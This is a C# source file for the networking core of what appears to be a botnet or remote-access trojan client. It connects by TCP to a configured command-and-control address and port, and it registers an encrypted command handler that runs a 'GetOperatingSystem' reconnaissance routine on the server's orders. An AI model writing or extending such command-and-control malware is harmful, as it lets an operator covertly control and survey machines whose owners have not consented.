using Client.Config;
using Client.Core.Events;
using Client.Core.Security;
using NetworkCommsDotNet.Connections;
using NetworkCommsDotNet.Connections.TCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Networking
{
    class NetworkManager
    {
        public static TCPConnection Connection;
        public static bool IsConnected
        {
            get
            {
                return Connection != null && Connection.ConnectionAlive();
            }
        }
        
        public static void Connect()
        {
            Connection = TCPConnection.GetConnection(new NetworkCommsDotNet.ConnectionInfo(Settings.CNC_ADDRESS, Settings.CNC_PORT), true);
            SetupHandlers();
        }   

        public static void Disconnect()
        {
            if(Connection != null && Connection.ConnectionAlive())
            {
                Connection.CloseConnection(false);
                Connection = null;
            }
            else
            {
                Connection = null;
            }
        }


        public static void SetupHandlers()
        {
            Connection.AppendIncomingPacketHandler<string>("GetOperatingSystem", (packetHeader, connection, incomingData) =>
            {
                GetOperatingSystem.Run(Cryptography.Decrypt(incomingData));
            });
        }


    }
}
